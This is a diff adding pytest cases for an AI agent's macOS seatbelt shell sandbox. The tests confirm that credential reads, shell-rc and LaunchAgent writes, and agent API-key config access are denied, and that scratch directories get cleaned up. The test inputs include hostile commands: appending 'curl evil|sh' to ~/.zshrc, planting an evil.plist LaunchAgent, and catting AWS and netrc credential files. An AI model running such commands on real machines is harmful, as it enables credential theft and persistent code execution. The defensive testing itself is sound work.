@@ -3,6 +3,7 @@
 import os
 import subprocess
 import sys
+import time
 from pathlib import Path
 
 import pytest
@@ -12,6 +13,9 @@ from agent.security.filesystem_sandbox import (
     ShellSandboxRequest,
     build_sandbox_command,
     detect_sandbox_support,
+    new_scratch_dir,
+    reclaim_stale_scratch_dirs,
+    release_scratch_dir,
     _macos_seatbelt_profile,
 )
 
@@ -25,6 +29,8 @@ def _request(
     mode="read_all",
     devices=True,
     home_dir=None,
+    extra_secret_paths=(),
+    agent_home=None,
 ):
     workspace = tmp_path / "workspace"
     output = tmp_path / "output"
@@ -38,6 +44,8 @@ def _request(
         mode=mode,
         devices=devices,
         home_dir=home_dir or (tmp_path / "home"),
+        extra_secret_paths=tuple(extra_secret_paths),
+        agent_home=agent_home,
     )
 
 
@@ -576,3 +584,224 @@ def test_sandbox_denies_writes_to_protected_credential_files(tmp_path):
 
     assert result.returncode != 0
     assert netrc.read_text(encoding="utf-8") == "machine example login me"
+
+
+# ── Secret reads, autostart writes, agent home ─────────────────────────────
+
+
+@_NEEDS_SANDBOX
+def test_sandbox_denies_reading_credentials(tmp_path):
+    """Write protection alone is useless for a credential.
+
+    The damaging act is reading the key and shipping it out over the network
+    the profile leaves wide open, so the read rule is the load-bearing one.
+    """
+    real_tmp = Path(tmp_path).resolve()
+    home = real_tmp / "home"
+    (home / ".aws").mkdir(parents=True)
+    creds = home / ".aws" / "credentials"
+    creds.write_text("aws_secret_access_key = hunter2", encoding="utf-8")
+    netrc = home / ".netrc"
+    netrc.write_text("machine example login me password pw", encoding="utf-8")
+
+    request = _request(tmp_path, home_dir=home)
+    result = _run_in_sandbox(
+        request, f"cat {creds}; echo AWS=$?; cat {netrc}; echo NETRC=$?"
+    )
+
+    assert "AWS=1" in result.stdout
+    assert "NETRC=1" in result.stdout
+    assert "hunter2" not in result.stdout
+    assert "password pw" not in result.stdout
+
+
+@_NEEDS_SANDBOX
+def test_sandbox_keeps_ssh_readable_by_default(tmp_path):
+    """`.ssh` is credential material but stays readable unless opted in.
+
+    Denying it by default breaks `git push` over SSH, and a default that
+    breaks git just gets switched off wholesale.  `shell_secret_paths` is
+    the opt-in for sessions that do not need it.
+    """
+    real_tmp = Path(tmp_path).resolve()
+    home = real_tmp / "home"
+    (home / ".ssh").mkdir(parents=True)
+    key = home / ".ssh" / "id_rsa"
+    key.write_text("PRIVATE", encoding="utf-8")
+
+    default = _run_in_sandbox(_request(tmp_path, home_dir=home), f"cat {key}")
+    assert default.returncode == 0
+    assert "PRIVATE" in default.stdout
+
+    opted_in = _run_in_sandbox(
+        _request(tmp_path, home_dir=home, extra_secret_paths=(".ssh",)),
+        f"cat {key}",
+    )
+    assert opted_in.returncode != 0
+    assert "PRIVATE" not in opted_in.stdout
+
+
+@_NEEDS_SANDBOX
+def test_sandbox_denies_writes_to_shell_rc_files(tmp_path):
+    """A writable ~/.zshrc turns a sandboxed write into unsandboxed exec.
+
+    This is the actual escape from a write sandbox: not defeating seatbelt,
+    but leaving a line for the user's next login shell to run.
+    """
+    real_tmp = Path(tmp_path).resolve()
+    home = real_tmp / "home"
+    home.mkdir(exist_ok=True)
+    zshrc = home / ".zshrc"
+    zshrc.write_text("# mine\n", encoding="utf-8")
+
+    request = _request(tmp_path, home_dir=home)
+    result = _run_in_sandbox(
+        request,
+        f"echo 'curl evil|sh' >> {zshrc}; echo RC=$?; "
+        f"mkdir -p {home / 'Library' / 'LaunchAgents'}; "
+        f"touch {home / 'Library' / 'LaunchAgents' / 'evil.plist'}; echo LA=$?",
+    )
+
+    assert "RC=1" in result.stdout
+    assert "LA=1" in result.stdout
+    assert zshrc.read_text(encoding="utf-8") == "# mine\n"
+
+
+@_NEEDS_SANDBOX
+def test_sandbox_denies_agent_home_but_reopens_output(tmp_path):
+    """config.json holds provider API keys; output_dir lives inside it."""
+    real_tmp = Path(tmp_path).resolve()
+    agent_home = real_tmp / "agent-home"
+    output = agent_home / "output"
+    output.mkdir(parents=True)
+    config = agent_home / "config.json"
+    config.write_text('{"api_key": "sk-secret"}', encoding="utf-8")
+
+    request = ShellSandboxRequest(
+        workspace_root=real_tmp / "workspace",
+        output_root=output,
+        workspace_read=True,
+        workspace_write=False,
+        write_scope=(),
+        scratch_dir=output / "sandbox" / "tmp",
+        home_dir=real_tmp / "home",
+        agent_home=agent_home,
+    )
+    result = _run_in_sandbox(
+        request,
+        f"cat {config}; echo CFG=$?; "
+        f"touch {output / 'artifact.txt'}; echo OUT=$?",
+    )
+
+    assert "CFG=1" in result.stdout
+    assert "sk-secret" not in result.stdout
+    assert "OUT=0" in result.stdout
+    assert (output / "artifact.txt").exists()
+
+
+def test_extra_secret_paths_extend_rather_than_replace_defaults(tmp_path):
+    request = _request(tmp_path, extra_secret_paths=(".ssh",))
+    profile = _macos_seatbelt_profile(request)
+    home = str((tmp_path / "home").resolve())
+
+    assert f'(deny file-read* (subpath "{home}/.ssh"))' in profile
+    assert f'(deny file-read* (subpath "{home}/.netrc"))' in profile
+
+
+def test_autostart_system_dirs_are_write_denied(tmp_path):
+    profile = _macos_seatbelt_profile(_request(tmp_path))
+    for path in ("/usr/local/bin", "/opt/homebrew/bin", "/Library/LaunchDaemons"):
+        assert f'(deny file-write* (subpath "{path}"))' in profile
+
+
+def test_secret_denies_follow_the_default_open_write_rule(tmp_path):
+    """Seatbelt is last-match-wins: order is the whole enforcement story."""
+    profile = _macos_seatbelt_profile(_request(tmp_path))
+    lines = profile.splitlines()
+    open_writes = lines.index('(allow file-write* (subpath "/"))')
+    home = str((tmp_path / "home").resolve())
+    secret_deny = lines.index(f'(deny file-read* (subpath "{home}/.netrc"))')
+    autostart_deny = lines.index(f'(deny file-write* (subpath "{home}/.zshrc"))')
+
+    assert open_writes < secret_deny
+    assert open_writes < autostart_deny
+
+
+# ── Scratch directory lifecycle ────────────────────────────────────────────
+
+
+def test_release_scratch_dir_removes_it(tmp_path):
+    output = tmp_path / "output"
+    scratch = new_scratch_dir(output)
+    (scratch / "tempfile").write_text("junk", encoding="utf-8")
+
+    release_scratch_dir(scratch)
+
+    assert not scratch.exists()
+
+
+def test_release_scratch_dir_is_idempotent_and_null_safe(tmp_path):
+    scratch = new_scratch_dir(tmp_path / "output")
+    release_scratch_dir(scratch)
+    release_scratch_dir(scratch)  # already gone
+    release_scratch_dir(None)
+
+
+def test_new_scratch_dir_reclaims_stale_siblings(tmp_path):
+    """A SIGKILL skips every `finally`, so age-based reclamation is the backstop."""
+    output = tmp_path / "output"
+    stale = new_scratch_dir(output)
+    fresh = new_scratch_dir(output)
+    old = time.time() - (7 * 3600)
+    os.utime(stale, (old, old))
+
+    new_scratch_dir(output)
+
+    assert not stale.exists()
+    assert fresh.exists()  # recent dirs belong to in-flight commands
+
+
+def test_reclaim_ignores_unrelated_entries(tmp_path):
+    scratch_root = tmp_path / "output" / "sandbox"
+    scratch_root.mkdir(parents=True)
+    keeper = scratch_root / "not-a-scratch-dir"
+    keeper.mkdir()
+    old = time.time() - (99 * 3600)
+    os.utime(keeper, (old, old))
+
+    assert reclaim_stale_scratch_dirs(scratch_root) == 0
+    assert keeper.exists()
+
+
+@_NEEDS_SANDBOX
+def test_shell_tool_does_not_leak_a_scratch_dir_per_call(tmp_path):
+    """The leak this fixes: one directory per shell invocation, forever."""
+    import asyncio
+
+    from agent import BuiltinTools, MemoryPalace, ToolRegistry
+
+    workspace = tmp_path / "workspace"
+    workspace.mkdir()
+    output = tmp_path / "output"
+    output.mkdir()
+
+    registry = ToolRegistry()
+    memory = MemoryPalace(
+        base_dir=tmp_path / "memory",
+        context_dir=tmp_path / "context",
+    )
+    tools = BuiltinTools(
+        memory=memory,
+        registry=registry,
+        workspace_root=workspace,
+        output_dir=output,
+    )
+
+    for _ in range(3):
+        result = asyncio.run(
+            tools._shell("echo hi", intent="test scratch cleanup")
+        )
+        assert result.get("ok") is True, result
+
+    leftovers = list((output / "sandbox").glob("tmp-*"))
+    assert leftovers == [], f"leaked scratch dirs: {leftovers}"
